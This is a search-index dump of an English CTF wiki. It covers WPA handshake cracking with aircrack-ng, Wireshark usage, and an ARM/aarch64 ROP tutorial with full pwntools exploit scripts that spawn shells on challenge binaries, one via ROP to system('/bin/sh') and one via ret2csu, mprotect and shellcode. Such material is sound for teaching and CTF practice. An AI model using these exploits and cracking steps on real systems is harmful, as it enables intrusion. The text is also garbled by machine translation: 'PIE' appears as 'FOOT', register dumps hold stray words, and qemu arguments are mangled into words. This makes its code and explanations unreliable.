Challenges"},{"location":"misc/traffic/protocols/USB/#references","text":"https://github.com/WangYihang/UsbMiceDataHacker https://github.com/WangYihang/UsbKeyboardDataHacker https://www.anquanke.com/post/id/85218 https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html https://blog.csdn.net/songze_lee/article/details/77658094 https://wiki.wireshark.org/USB http://www.usb.org/developers/hidpage/Hut1_12v2.pdf https://www.wireshark.org/docs/man-pages/tshark.html http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ https://hackfun.org/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/","title":"References"},{"location":"misc/traffic/protocols/WIFI/","text":"WIFI \u00b6 802.11 is a common standard for wireless LANs today. Common authentication methods: None WEP\u200d\u200d WPA/WPA2-PSK (pre-shared key)\u200d\u200d WPA2 802.1X ( radius certificate) WPA-PSK \u00b6 The general process of authentication is shown: Four handshakes: 4 Ways handshake starts at the AP, it then generates a random string (ANonce) and sends it to the requester. The requester also generates its own random SNonce, and then uses these two Nonces and PMK to generate the PTK. The requester replies message 2 to the authenticator and a MIC (message integrity code) as the verification of the PMK. The authenticator sends information from the requester\u2019s message 2 back to the requester, once it\u2019s verified, it will generate GTK if needed. Then, sends it as message 3. The requester receives message 3, verifies the MIC, installs the key, sends a message 4, and a confirmation message. The verifier receives message 4, verifies the MIC, installs the same key. CTF Example \u00b6 Experiment Lab - shipin \u00b6 Download the PCAP file here From a large number of Deauth packets, we obtained the handshake packets in the traffics, which we can use to crack the WIFI password. Next, we crack the password. You can use the aircrack suite. Run the command aircrack-ng shipin.cap -w /usr/share/wordlists/rockyou.txt We found the key, 88888888 . Now, we can use the key found to decrypt the packets within the WIFI network. Go to Edit --> Preferences --> Protocols --> IEEE802.11 --> Edit in Wireshark. Fill in the form key-type:key to decrypt the packets to see the clear text traffic. There is no flag in this challenge. References \u00b6 http://www.freebuf.com/articles/wireless/58342.html http://blog.csdn.net/keekjkj/article/details/46753883","title":"WIFI"},{"location":"misc/traffic/protocols/WIFI/#wifi","text":"802.11 is a common standard for wireless LANs today. Common authentication methods: None WEP\u200d\u200d WPA/WPA2-PSK (pre-shared key)\u200d\u200d WPA2 802.1X ( radius certificate)","title":"WIFI"},{"location":"misc/traffic/protocols/WIFI/#wpa-psk","text":"The general process of authentication is shown: Four handshakes: 4 Ways handshake starts at the AP, it then generates a random string (ANonce) and sends it to the requester. The requester also generates its own random SNonce, and then uses these two Nonces and PMK to generate the PTK. The requester replies message 2 to the authenticator and a MIC (message integrity code) as the verification of the PMK. The authenticator sends information from the requester\u2019s message 2 back to the requester, once it\u2019s verified, it will generate GTK if needed. Then, sends it as message 3. The requester receives message 3, verifies the MIC, installs the key, sends a message 4, and a confirmation message. The verifier receives message 4, verifies the MIC, installs the same key.","title":"WPA-PSK"},{"location":"misc/traffic/protocols/WIFI/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/traffic/protocols/WIFI/#experiment-lab-shipin","text":"Download the PCAP file here From a large number of Deauth packets, we obtained the handshake packets in the traffics, which we can use to crack the WIFI password. Next, we crack the password. You can use the aircrack suite. Run the command aircrack-ng shipin.cap -w /usr/share/wordlists/rockyou.txt We found the key, 88888888 . Now, we can use the key found to decrypt the packets within the WIFI network. Go to Edit --> Preferences --> Protocols --> IEEE802.11 --> Edit in Wireshark. Fill in the form key-type:key to decrypt the packets to see the clear text traffic. There is no flag in this challenge.","title":"Experiment Lab - shipin"},{"location":"misc/traffic/protocols/WIFI/#references","text":"http://www.freebuf.com/articles/wireless/58342.html http://blog.csdn.net/keekjkj/article/details/46753883","title":"References"},{"location":"misc/traffic/protocols/Wireshark/","text":"Wireshark Common Features \u00b6 Display Filter \u00b6 Display filters can use several different parameters as matching criteria, such as IP address, protocol, port number, and some protocol header\u2019s parameters. In addition, users use some conditionals and concatenation operators to create more complex expressions. Users can combine different expressions to filter out a precise range of packets. All packets displayed can be filtered by bytes within the packets. A display filter follows this structure: [not] Expression [and|or] [not] Expression Often used operators: Operator Description == Equal != Not Equal > Greater Than < Less Than >= Greater Than or Equal To <= Less Than or Equal To && AND || OR ! NOT Filter Methods \u00b6 There are many ways to do display filter: Display filter expression Analyze --> Display Filter Expression Display filter toolbar Right-clicking on a specific filed and Apply Selected As Filter Note You can obtain the complex filtering expression with this method. Statistics Information \u00b6 Protocol Hierarchy \u00b6 Statistics --> Protocol Hierarchy A hierarchy of all the protocols contained in the file. Conversations \u00b6 Statistics --> Conversations All traffic occurring between IP addresses of a particular endpoint. Note Check the IP address that sent or received many data streams. If you know that server, then the problem is solved. However, it\u2019s possible that is it just some device scanning the network or generating a large amount of data. Check for scan patterns. If a device made one scan, then that\u2019s likely normal. For example, SNMP software sent a ping message to find the network. However, if there are many scans, then something fishy is happening. Endpoints \u00b6 Statistics --> Endpoints List all endpoints found by Wireshark. HTTP - Packet Counter \u00b6 Statistics --> HTTP --> Packet Counter Count HTTP packets.","title":"Wireshark"},{"location":"misc/traffic/protocols/Wireshark/#wireshark-common-features","text":"","title":"Wireshark Common Features"},{"location":"misc/traffic/protocols/Wireshark/#display-filter","text":"Display filters can use several different parameters as matching criteria, such as IP address, protocol, port number, and some protocol header\u2019s parameters. In addition, users use some conditionals and concatenation operators to create more complex expressions. Users can combine different expressions to filter out a precise range of packets. All packets displayed can be filtered by bytes within the packets. A display filter follows this structure: [not] Expression [and|or] [not] Expression Often used operators: Operator Description == Equal != Not Equal > Greater Than < Less Than >= Greater Than or Equal To <= Less Than or Equal To && AND || OR ! NOT","title":"Display Filter"},{"location":"misc/traffic/protocols/Wireshark/#filter-methods","text":"There are many ways to do display filter: Display filter expression Analyze --> Display Filter Expression Display filter toolbar Right-clicking on a specific filed and Apply Selected As Filter Note You can obtain the complex filtering expression with this method.","title":"Filter Methods"},{"location":"misc/traffic/protocols/Wireshark/#statistics-information","text":"","title":"Statistics Information"},{"location":"misc/traffic/protocols/Wireshark/#protocol-hierarchy","text":"Statistics --> Protocol Hierarchy A hierarchy of all the protocols contained in the file.","title":"Protocol Hierarchy"},{"location":"misc/traffic/protocols/Wireshark/#conversations","text":"Statistics --> Conversations All traffic occurring between IP addresses of a particular endpoint. Note Check the IP address that sent or received many data streams. If you know that server, then the problem is solved. However, it\u2019s possible that is it just some device scanning the network or generating a large amount of data. Check for scan patterns. If a device made one scan, then that\u2019s likely normal. For example, SNMP software sent a ping message to find the network. However, if there are many scans, then something fishy is happening.","title":"Conversations"},{"location":"misc/traffic/protocols/Wireshark/#endpoints","text":"Statistics --> Endpoints List all endpoints found by Wireshark.","title":"Endpoints"},{"location":"misc/traffic/protocols/Wireshark/#http-packet-counter","text":"Statistics --> HTTP --> Packet Counter Count HTTP packets.","title":"HTTP - Packet Counter"},{"location":"pwn/readme/","text":"Outline some directions of pwn, as well as ideas. GLIBC Pwn \u00b6 Usually related to memory management under linux. As we often say the house of series content Browser Pwn \u00b6 Browser-related Pwn https://github.com/Escapingbug/awesome-browser-exploit Kernel Pwn \u00b6 Windows Kernel \u00b6 Linux Kernel \u00b6 The Linux kernel vulnerabilities, in the case of CTFs, are mostly LKM vulnerabilities. These vulnerabilities are used to achieve privilege and secure shells. ALL \u00b6 Need a new document section for english. Look into reccursivly translating into english through google. Get a public work to clean up grammar.","title":"Readme"},{"location":"pwn/readme/#glibc-pwn","text":"Usually related to memory management under linux. As we often say the house of series content","title":"GLIBC Pwn"},{"location":"pwn/readme/#browser-pwn","text":"Browser-related Pwn https://github.com/Escapingbug/awesome-browser-exploit","title":"Browser Pwn"},{"location":"pwn/readme/#kernel-pwn","text":"","title":"Kernel Pwn"},{"location":"pwn/readme/#windows-kernel","text":"","title":"Windows Kernel"},{"location":"pwn/readme/#linux-kernel","text":"The Linux kernel vulnerabilities, in the case of CTFs, are mostly LKM vulnerabilities. These vulnerabilities are used to achieve privilege and secure shells.","title":"Linux Kernel"},{"location":"pwn/readme/#all","text":"Need a new document section for english. Look into reccursivly translating into english through google. Get a public work to clean up grammar.","title":"ALL"},{"location":"pwn/linux/arm/arm_rop/","text":"arm - ROP \u00b6 Introduction \u00b6 Because the pwn of architectures such as arm and mips is still a simple stack vulnerability, so I only intend to introduce the rop under arm. The use of other vulnerabilities will be introduced gradually. Prerequisite knowledge \u00b6 First look at the function calling convention under arm. The first to fourth parameters of the function are stored in the r0 to r3 registers, and the remaining parameters are pushed into the stack from right to left. The caller implements stack balancing. The return value of the function is stored in r0 In addition, arm b/bl and other instructions implement jumps; pc register is equivalent to x86 eip, save the address of the next instruction, is also the target we want to control jarvisoj - typo \u00b6 Here is an example of jarvisoj's typo, which can be downloaded at [ctf-challenge] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo ) Determining protection \u00b6 jarvisOJ_typo [ master\u25cf\u25cf ] check ./typo typo: ELF 32 -bit LSB executable, ARM, EABI5 version 1 ( SYSV ) , statically linked, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped [ * ] & #39;/ home / m4x / pwn_repo / jarvisOJ_typo / typo&#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled FOOT: No FOOT ( 0x8000 ) Statically linked programs, no open stack overflow protection and PIE; static link instructions, we can find dangerous functions such as system and \"/bin/sh\" sensitive strings in binary, because it is No PIE, so we only need stack overflow to construct ropchain to get shell Using ideas \u00b6 So we need to find an overflow point, run the program first, because it is statically linked, so you can run it directly when the environment is configured well. jarvisOJ_typo [ master \u25cf\u25cf ] ./typo Let ' s Do Some Typing Exercise~ Press Enter to get start ; Input ~ if you want to quit ------Begin------ throng throng survive aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa qemu: uncaught target signal 11 ( Segmentation fault ) - core dumped [ 1 ] 1172 segmentation fault ./typo There are not many input points in the program, it is easy to find the overflow point. Constructing ROP \u00b6 So the idea is very obvious, using the stack overflow construct system(\"/bin/sh\") , first find the gadgets jarvisOJ_typo [ master\u25cf\u25cf ] ROPgadget --binary ./typo --only \"pop\" Gadgets information ============================================================ 0x00020904 : pop { r0, r4, pc } 0x00068bec : pop { r1, pc } 0x00008160 : pop { r3, pc } 0x0000ab0c : pop { r3, r4, r5, pc } 0x0000a958 : pop { r3, r4, r5, r6, r7, pc } 0x00014a70 : pop { r3, r4, r7, pc } 0x000083b0 : pop { r4, pc } 0x00009284 : pop { r4, r5, pc } 0x000095b8 : pop { r4, r5, r6, pc } 0x000082e8 : pop { r4, r5, r6, r7, pc } 0x00023ed4 : pop { r4, r5, r7, pc } 0x00023dbc : pop { r4, r7, pc } 0x00014068 : pop { r7, pc } Unique gadgets found: 13 We only need to control the first parameter, so we can choose pop {r0, r4, pc} this gadgets to construct the following stack structure. +-------------+ | | | padding | +-------------+ | padding | <- frame pointer +-------------+ |gadgets_addr | <- return address +-------------+ |binsh_addr | +-------------+ |junk_data | +-------------+ |system_addr | +-------------+ At this time, you need the length of padding and the address of system and /bin/sh. The address of /bin/sh can be found with ROPgadget. jarvisOJ_typo [ master\u25cf\u25cf ] ROPgadget --binary ./typo --string /bin/sh Strings information ============================================================ 0x0006cb70 : /bin/sh The length of padding can be easily found using pwntools' cyclic pwndbg> cyclic 200 aaaabaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababa pwndbg> c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x62616164 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 R0 0x0 R1 0xfffef024 \u25c2\u2014 0x61616161 ('aaaa') R2 0x7e R3 0x0 R4 0x62616162 (&#39;baab&#39;) R5 0x0 R6 0x0 R7 0x0 R8 0x0 R9 0xa5ec \u25c2\u2014 push {r3, r4, r5, r6, r7, r8, sb, lr} R10 0xa68c \u25c2\u2014 push {r3, r4, r5, lr} R11 0x62616163 (&#39;resist&#39;) R12 0x0 SP 0xfffef098 \u25c2\u2014 0x62616165 ('eaab') PC 0x62616164 ('daab') \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500 Invalid address 0x62616164 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 sp 0xfffef098 \u25c2\u2014 0x62616165 ('eaab') 01: 0004\u2502 0xfffef09c \u25c2- 0x62616166 (&#39;faab&#39;) 02: 0008\u2502 0xfffef0a0 \u25c2- 0x62616167 (&#39;gaab&#39;) 03: 000c\u2502 0xfffef0a4 \u25c2\u2014 0x62616168 (&#39;haab&#39;) 04:0010\u2502 0xfffef0a8 \u25c2\u2014 0x62616169 ('iaab') 05: 0014\u2502 0xfffef0ac \u25c2- 0x6261616a (&#39;jaab&#39;) 06:0018\u2502 0xfffef0b0 \u25c2\u2014 0x6261616b ('kaab') 07: 001c\u2502 0xfffef0b4 \u25c2- 0x6261616c (&#39;boom&#39;) Program received signal SIGSEGV pwndbg> cyclic -l 0x62616164 112 So the padding length is 112 > Or you can blast the stack overflow directly more violently As for the address of system, because the binary is removed from the symbol table, we can first use rizzo to restore part of the symbol table (for the recovery symbol table, you can see the reference link first, and will introduce it later). Although rizzo does not work well on this binary, it is fortunate that there are just a few systems in the identified functions. char * __fastcall system ( int a1 ) { char * result ; // r0 if ( a1 ) result = sub_10BA8 ( a1 ); else result = ( char * )( sub_10BA8 (( int ) \"exit 0\" ) == 0 ); return result ; } > Or you can find the system function by searching for the /bin/sh string exp \u00b6 All the conditions are there, construct system(\"/bin/sh\") jarvisOJ_typo [master\u25cf\u25cf] cat solve.py #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import sys import pdb # context.log_level = \"debug\" # for i in range(100, 150)[::-1]: for i in range(112, 123): if sys.argv[1] == \"l\": io = process (&quot;./ typo&quot;, timeout = 2) elif sys.argv [1] == &quot;d&quot;: io = process([\"qemu-arm\", \"-g\", \"1234\", \"./typo\"]) else: io = remote(\"pwn2.jarvisoj.com\", 9888, timeout = 2) io.sendafter(\"quit\\n\", \"\\n\") io.recvline () ''' jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --string /bin/sh Strings information ============================================================ 0x0006c384 : /bin/sh jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --only \"pop|ret\" | grep r0 0x00020904 : pop {r0, r4, pc} ''' payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4) success(i) io.sendlineafter(\"\\n\", payload) # pause() try: # pdb.set_trace() io.sendline (&quot;echo aaaa&quot;) io.recvuntil (&quot;aaaa&quot;, timeout = 1) except EOFError: io.close () continue else: io.interactive () 2018 Shanghai University Student Network Security Competition - baby_arm \u00b6 Static analysis \u00b6 The title gave a aarch64 schema file without open canary protection Shanghai2018_baby_arm [ master ] check ./pwn + file ./pwn ./pwn: ELF 64 -bit LSB executable, ARM aarch64, version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3 .7.0, BuildID [ sha1 ]= e988eaee79fd41139699d813eac0c375dbddba43, stripped + checksec ./pwn [ * ] '/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn' Arch: aarch64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) Look at the program logic __int64 main_logic () { Init (); write ( 1L L , \"Name:\" , 5L L ); read ( 0L L , input , 512L L ); sub_4007F0 (); return 0L L ; } void sub_4007F0 () { __int64 v0 ; // [xsp+10h] [xbp+10h] read ( 0L L , & v0 , 512L L ); } The trunk of the program reads 512 characters to a global variable, and in sub_4007F0() , it reads 512 bytes onto the stack. Note that this starts directly from frame pointer + 0x10 Read, so it doesn't matter if you turn on canary protection. Ideas \u00b6 Take a look at the idea, you can directly rop, but we do not know the remote libc version, but also found that the program has a code segment called mprotect .text:00000000004007C8 STP X29, X30, [SP,#-0x10]! .text:00000000004007CC MOV X29, SP .text:00000000004007D0 MOV W2, #0 .text:00000000004007D4 MOV X1, #0x1000 .text:00000000004007D8 MOV X0, #0x1000 .text:00000000004007DC MOVK X0, #0x41,LSL#16 .text:00000000004007E0 BL .mprotect .text:00000000004007E4 NOP .text:00000000004007E8 LDP X29, X30, [SP],#0x10 .text: 00000000004007EC RET But this code sets the permission bit of mprotect to 0, there is no executable permission, which requires us to control the permissions such as bss section by rop control mprotect to be writable executable. So you can have the following ideas: When you type name for the first time, write shellcode in the bss section. Call mprotect via rop to change the permissions of bss Return to the shellcode on bss mprotect needs to control three parameters, you can consider using ret2csu This method can be found as follows Gadgets to control the x0, x1, x2 registers .text:00000000004008AC LDR X3, [X21,X19,LSL#3] .text:00000000004008B0 MOV X2, X22 .text:00000000004008B4 MOV X1, X23 .text:00000000004008B8 MOV W0, W24 .text:00000000004008BC ADD X19, X19, #1 .text:00000000004008C0 BLR X3 .text:00000000004008C4 CMP X19, X20 .text:00000000004008C8 B.NE loc_4008AC .text:00000000004008CC .text:00000000004008CC loc_4008CC ; CODE XREF: sub_400868+3C\u2191j .text:00000000004008CC LDP X19, X20, [SP,#var_s10] .text:00000000004008D0 LDP X21, X22, [SP,#var_s20] .text:00000000004008D4 LDP X23, X24, [SP,#var_s30] .text:00000000004008D8 LDP X29, X30, [SP+var_s0],#0x40 .text: 00000000004008DC RET The final exp is as follows: #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import sys context . binary = \"./pwn\" context . log_level = \"debug\" if sys . argv [ 1 ] == \"l\" : io = process ([ & quot ; QEMU - aarch64 & quot ;, & quot ; - The & quot ;, & quot ; / usr / aarch64 - linux - gnu & quot ;, & quot ; ./ pwn & quot ;]) elif sys . argv [ 1 ] == & quot ; d & quot ;: io = process ([ & quot ; QEMU - aarch64 & quot ;, & quot ; G & quot ;, & quot ; 1234 & quot ;, & quot ; - The & quot ;, & quot ; / usr / aarch64 - linux - gnu & quot ;, & quot ; ./ pwn & quot ;]) else : io = remote ( & quot ; 106.75 . 126.171 & quot ;, 33865 ) def csu_rop ( call , x0 , x1 , x2 ): payload = flat ( 0x4008CC , '00000000' , 0x4008ac , 0 , 1 , call ) payload += flat ( x2 , x1 , x0 ) payload += '22222222' return payload if __name__ == \"__main__\" : elf = ELF ( \"./pwn\" , checksec = False ) padding = asm ( 'mov x0, x0' ) sc = asm ( shellcraft . execve ( \"/bin/sh\" )) # print disasm(padding * 0x10 + sc) io . sendafter ( \"Name:\" , padding * 0x10 + sc ) sleep ( 0.01 ) # io.send(cyclic(length = 500, n = 8)) # rop = flat() payload = flat ( cyclic ( 72 ), csu_rop ( elf . got [ 'read' ], 0 , elf . got [ '__gmon_start__' ], 8 )) payload += flat ( 0x400824 ) io . send ( payload ) sleep ( 0.01 ) io . send ( flat ( elf . plt [ 'mprotect' ])) sleep ( 0.01 ) raw_input ( \"DEBUG: \" ) io . sendafter ( \"Name:\" , padding * 0x10 + sc ) sleep ( 0.01 ) payload = flat ( cyclic ( 72 ), csu_rop ( elf . got [ '__gmon_start__' ], 0x411000 , 0x1000 , 7 )) payload += flat ( 0x411068 ) sleep ( 0.01 ) io . send ( payload ) io . interactive () notice \u00b6 At the same time, it should be noted that the result of the checksec detection is that nx protection is turned on, but the result of this detection is not necessarily accurate, because the nx protection of the program can also be determined by the parameter -nx when qemu is started (such as this The problem can be nx protected by the error detection program when the remote fails. The old version of qemu may not have this parameter. Desktop ./qemu-aarch64 --version qemu-aarch64 version 2 .7.0, Copyright ( c ) 2003 -2016 Fabrice Bellard and the QEMU Project developers Desktop ./qemu-aarch64 -h | grep nx -nx QEMU_NX enable NX implementation If there is an error below, there is no assembler for aarch64 [ ERROR ] Could not find 'as' installed for ContextType ( arch = 'aarch64' , binary = ELF ( '/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn' ) , bits = 64 , endian = 'little' , log_level = 10 ) Try installing binutils for this architecture: https://docs.pwntools.com/en/stable/install/binutils.html Can refer to the official documentation solution Shanghai2018_baby_arm [ master\u25cf ] apt search binutils | grep aarch64 p binutils-aarch64-linux-gnu - GNU binary utilities, for aarch64-linux-gnu target p binutils-aarch64-linux-gnu:i386 - GNU binary utilities, for aarch64-linux-gnu target p binutils-aarch64-linux-gnu-dbg - GNU binary utilities, for aarch64-linux-gnu target ( debug symbols ) p binutils-aarch64-linux-gnu-dbg:i386 - GNU binary utilities, for aarch64-linux-gnu target ( debug symbols ) Shanghai2018_baby_arm [ master\u25cf ] sudo apt install bintuils-aarch64-linux-gnu > aarch64 files are arm64 when libc is installed and aarch64 when binutils is installed. Example \u00b6 Codegate2015 - looked references \u00b6 http://www.freebuf.com/articles/terminal/134980.html","title":"arm-rop"},{"location":"pwn/linux/arm/arm_rop/#arm-rop","text":"","title":"arm - ROP"},{"location":"pwn/linux/arm/arm_rop/#introduction","text":"Because the pwn of architectures such as arm and mips is still a simple stack vulnerability, so I only intend to introduce the rop under arm. The use of other vulnerabilities will be introduced gradually.","title":"Introduction"},{"location":"pwn/linux/arm/arm_rop/#prerequisite-knowledge","text":"First look at the function calling convention under arm. The first to fourth parameters of the function are stored in the r0 to r3 registers, and the remaining parameters are pushed into the stack from right to left. The caller implements stack balancing. The return value of the function is stored in r0 In addition, arm b/bl and other instructions implement jumps; pc register is equivalent to x86 eip, save the address of the next instruction, is also the target we want to control","title":"Prerequisite knowledge"},{"location":"pwn/linux/arm/arm_rop/#jarvisoj-typo","text":"Here is an example of jarvisoj's typo, which can be downloaded at [ctf-challenge] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo )","title":"jarvisoj - typo"},{"location":"pwn/linux/arm/arm_rop/#determining-protection","text":"jarvisOJ_typo [ master\u25cf\u25cf ] check ./typo typo: ELF 32 -bit LSB executable, ARM, EABI5 version 1 ( SYSV ) , statically linked, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped [ * ] & #39;/ home / m4x / pwn_repo / jarvisOJ_typo / typo&#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled FOOT: No FOOT ( 0x8000 ) Statically linked programs, no open stack overflow protection and PIE; static link instructions, we can find dangerous functions such as system and \"/bin/sh\" sensitive strings in binary, because it is No PIE, so we only need stack overflow to construct ropchain to get shell","title":"Determining protection"},{"location":"pwn/linux/arm/arm_rop/#using-ideas","text":"So we need to find an overflow point, run the program first, because it is statically linked, so you can run it directly when the environment is configured well. jarvisOJ_typo [ master \u25cf\u25cf ] ./typo Let ' s Do Some Typing Exercise~ Press Enter to get start ; Input ~ if you want to quit ------Begin------ throng throng survive aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa qemu: uncaught target signal 11 ( Segmentation fault ) - core dumped [ 1 ] 1172 segmentation fault ./typo There are not many input points in the program, it is easy to find the overflow point.","title":"Using ideas"},{"location":"pwn/linux/arm/arm_rop/#constructing-rop","text":"So the idea is very obvious, using the stack overflow construct system(\"/bin/sh\") , first find the gadgets jarvisOJ_typo [ master\u25cf\u25cf ] ROPgadget --binary ./typo --only \"pop\" Gadgets information ============================================================ 0x00020904 : pop { r0, r4, pc } 0x00068bec : pop { r1, pc } 0x00008160 : pop { r3, pc } 0x0000ab0c : pop { r3, r4, r5, pc } 0x0000a958 : pop { r3, r4, r5, r6, r7, pc } 0x00014a70 : pop { r3, r4, r7, pc } 0x000083b0 : pop { r4, pc } 0x00009284 : pop { r4, r5, pc } 0x000095b8 : pop { r4, r5, r6, pc } 0x000082e8 : pop { r4, r5, r6, r7, pc } 0x00023ed4 : pop { r4, r5, r7, pc } 0x00023dbc : pop { r4, r7, pc } 0x00014068 : pop { r7, pc } Unique gadgets found: 13 We only need to control the first parameter, so we can choose pop {r0, r4, pc} this gadgets to construct the following stack structure. +-------------+ | | | padding | +-------------+ | padding | <- frame pointer +-------------+ |gadgets_addr | <- return address +-------------+ |binsh_addr | +-------------+ |junk_data | +-------------+ |system_addr | +-------------+ At this time, you need the length of padding and the address of system and /bin/sh. The address of /bin/sh can be found with ROPgadget. jarvisOJ_typo [ master\u25cf\u25cf ] ROPgadget --binary ./typo --string /bin/sh Strings information ============================================================ 0x0006cb70 : /bin/sh The length of padding can be easily found using pwntools' cyclic pwndbg> cyclic 200 aaaabaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababa pwndbg> c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x62616164 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 R0 0x0 R1 0xfffef024 \u25c2\u2014 0x61616161 ('aaaa') R2 0x7e R3 0x0 R4 0x62616162 (&#39;baab&#39;) R5 0x0 R6 0x0 R7 0x0 R8 0x0 R9 0xa5ec \u25c2\u2014 push {r3, r4, r5, r6, r7, r8, sb, lr} R10 0xa68c \u25c2\u2014 push {r3, r4, r5, lr} R11 0x62616163 (&#39;resist&#39;) R12 0x0 SP 0xfffef098 \u25c2\u2014 0x62616165 ('eaab') PC 0x62616164 ('daab') \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] 